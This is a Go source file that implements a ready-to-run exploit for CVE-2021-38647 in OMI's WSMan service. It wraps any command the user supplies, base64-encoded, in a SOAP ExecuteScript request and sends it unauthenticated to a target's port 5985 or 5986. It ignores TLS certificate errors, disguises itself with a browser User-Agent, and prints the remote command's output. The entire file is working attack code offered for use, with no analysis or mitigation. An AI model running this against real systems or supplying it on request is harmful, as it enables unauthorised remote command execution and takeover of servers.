package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"html"
	"io/ioutil"
	"log"
	"net/http"
	"regexp"
	"time"
)

const DATA = `
<?xml version="1.0"?>
<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd">
  <s:Header>
    <a:To>HTTP://127.0.0.1:5985/wsman/</a:To>
    <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
    <a:ReplyTo>
      <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
    </a:ReplyTo>
    <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteScript</a:Action>
    <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
    <a:MessageID>uuid:00B60933-CC01-0005-0000-000000010000</a:MessageID>
    <w:OperationTimeout>PT1M30S</w:OperationTimeout>
    <w:Locale xml:lang="en-us" s:mustUnderstand="false"/>
    <p:DataLocale xml:lang="en-us" s:mustUnderstand="false"/>
    <w:OptionSet s:mustUnderstand="true"/>
    <w:SelectorSet>
      <w:Selector Name="__cimnamespace">root/scx</w:Selector>
    </w:SelectorSet>
  </s:Header>
  <s:Body>
    <p:ExecuteScript_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
      <p:Script>%s</p:Script>
      <p:Arguments/>
      <p:timeout>0</p:timeout>
      <p:b64encoded>true</p:b64encoded>
    </p:ExecuteScript_INPUT>
  </s:Body>
</s:Envelope>
`

func exploit(target, payload string, port int) {
	var url string

	switch port {
	case 5986:
		url = fmt.Sprintf("https://%s:%d/wsman", target, port)
	case 5985:
		url = fmt.Sprintf("http://%s:%d/wsman", target, port)
	default:
		log.Fatal("Please enter a valid port (5986 or 5985).")

	}

	request, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(payload)))
	if err != nil {
		log.Fatal(err)
	}
	request.Header.Set("Content-Type", "application/soap+xml;charset=UTF-8")
	request.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")

	tp := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // ignore expired SSL certificates
	}

	client := &http.Client{Transport: tp, Timeout: 5 * time.Second}
	response, err := client.Do(request)
	if err != nil {
		log.Fatal("Error getting HTTP response. Is the target vulnerable?")
	}
	defer response.Body.Close()

	if response.StatusCode != http.StatusOK {
		log.Fatal("Something went wrong, got HTTP status code: ", response.StatusCode)
	}

	body, _ := ioutil.ReadAll(response.Body)

	r1 := regexp.MustCompile("<p:StdOut>(.*)</p:StdOut>")
	r2 := regexp.MustCompile("<p:StdErr>(.*)</p:StdErr>")
	stdout := r1.FindStringSubmatch(string(body))
	stderr := r2.FindStringSubmatch(string(body))

	if stdout != nil {
		if stdout[1] != "" {
			fmt.Print(html.UnescapeString(stdout[1]))
		}
	}
	if stderr != nil {
		if stderr[1] != "" {
			fmt.Print(html.UnescapeString(stderr[1]))
		}
	}
}

func main() {
	target := flag.String("t", "", "IP address of the vulnerable server. ")
	command := flag.String("c", "", "Command to run. ")
	port := flag.Int("p", 5986, "Remote WSMan port. ")

	flag.Usage = func() {
		fmt.Println("USAGE: go run CVE-2021-38647.go [FLAGS]")
		flag.PrintDefaults()

	}
	flag.Parse()
	log.SetFlags(0)
	enc := base64.StdEncoding.EncodeToString([]byte(*command))
	payload := fmt.Sprintf(DATA, enc)

	exploit(*target, payload, *port)

}
